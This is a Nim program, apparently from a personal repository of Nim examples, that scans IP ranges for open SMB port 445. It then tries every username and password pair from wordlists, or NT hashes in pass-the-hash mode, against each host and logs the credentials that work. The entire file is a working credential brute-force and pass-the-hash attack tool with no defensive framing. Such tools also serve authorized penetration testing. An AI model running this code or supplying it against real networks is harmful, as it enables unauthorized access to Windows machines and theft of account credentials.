#[
Author: StudyCat
Blog: https://www.cnblogs.com/studycat
Github: https://github.com/StudyCat404/myNimExamples
License: BSD 3-Clause
]#

import SMBExec
import SMBExec/HelpUtil
import strformat
import nimpy
import os
import strutils
import net

let logFilename = "smbLogin.log"
var logFile: File
logFile = open(logFilename, fmAppend)

proc telnet(host: string): bool =
    var socket = newSocket()
    try:
        socket.connect(host, Port(445), timeout=2000)
        return true
    except:
        printC Error, fmt"{host}:445 close smb"
        return false
    finally:
        socket.close()

proc ipParser(somestr: string): seq[string] =
    var ipaddress = pyImport("ipaddress")
    var nodes: seq[string]
    if fileExists(somestr):
        for line in somestr.lines:
            nodes.add(line)
    else:
        nodes.add(somestr.split(','))

    for node in nodes:
        try:
            let net4 = ipaddress.ip_network(node, strict=false)            
            if net4.num_addresses.to(int) > 1:
                for x in net4.hosts():
                    result.add($x)
            else:
                let ip = ipaddress.ip_address(node)
                result.add($ip)
        except:
            #somestr does not appear to be an IPv4 or IPv6 network
            #echo getCurrentExceptionMsg()
            discard

proc smbPlainLogin(host, domain, user, pass: string) =
    let nthash = toNTLMHash(pass)
    try:
        var smb = newSMB2(host, domain, user, nthash)
        let response = smb.connectTest()
        if response:
            printC Success, fmt"{host} - '{user}':'{pass}' Successfully logged on!"
            logFile.writeLine(fmt"{host} - '{user}':'{pass}' Successfully logged on!")
        else:
            printC Error, fmt"{host} - '{user}':'{pass}' Login failed"
        smb.close()
    except:
        echo getCurrentExceptionMsg()
    
proc smbHashLogin(host, domain, user, nthash: string) =
    var smb = newSMB2(host, domain, user, nthash)
    let response = smb.connectTest()
    if response:
        printC Success, fmt"{host} - '{user}':'{nthash}' Successfully logged on!"
        logFile.writeLine(fmt"{host} - '{user}':'{nthash}' Successfully logged on!")
    else:
        printC Error, fmt"{host} - '{user}':'{nthash}' Login failed"
    smb.close()

proc main() =
    if paramCount() < 2:
        let pathSplit = splitPath(paramStr(0))
        echo "Usage: ", pathSplit.tail, " plain", " 10.10.10.0/24" 
        echo "Usage: ", pathSplit.tail, " hash", " 10.10.10.0/24" 
        echo "Usage: ", pathSplit.tail, " plain", " ip.txt"
        quit()
        
    let mode = paramStr(1)
    let hosts = ipParser(paramStr(2))
    
    if toLowerAscii(mode) notin ["hash","plain"]:
        echo "Only plain password or nthash authentication is supported"
        quit()
    
    if fileExists("userpass.txt"):
        var credential: tuple[user, pass: string]
        var userpass: seq[tuple[user, pass: string]]
        try:
            for line in "userpass.txt".lines:
                let t = split(line, " ", 1)
                credential.user = t[0]
                credential.pass = t[1]
                userpass.add(credential)
        except:
            echo getCurrentExceptionMsg()
            quit()
            
        if toLowerAscii(mode) == "plain":   
            for host in hosts:
                if telnet(host):
                    for credential in userpass:
                        smbPlainLogin(host, ".", credential.user, credential.pass)
            
        if toLowerAscii(mode) == "hash":
            for host in hosts:
                if telnet(host):
                    for credential in userpass:
                        smbHashLogin(host, ".", credential.user, credential.pass)
            
    elif fileExists("user.txt") and fileExists("pass.txt"):
        var users: seq[string]
        var passes: seq[string]
        for line in "user.txt".lines:
            users.add(line)
        for line in "pass.txt".lines:
            passes.add(line)   

        if toLowerAscii(mode) == "plain":
            for host in hosts:
                if telnet(host):
                    for user in users:
                        for pass in passes:
                            smbPlainLogin(host, ".", user, pass)
            
        if toLowerAscii(mode) == "hash":
            for host in hosts:
                if telnet(host):
                    for user in users:
                        for pass in passes:
                            smbHashLogin(host, ".", user, pass)           
    else:
        echo "userpass.txt not found"
        echo "user.txt or pass.txt not found"
        quit()
    
    logFile.close()
when isMainModule:
    when defined windows:
        main()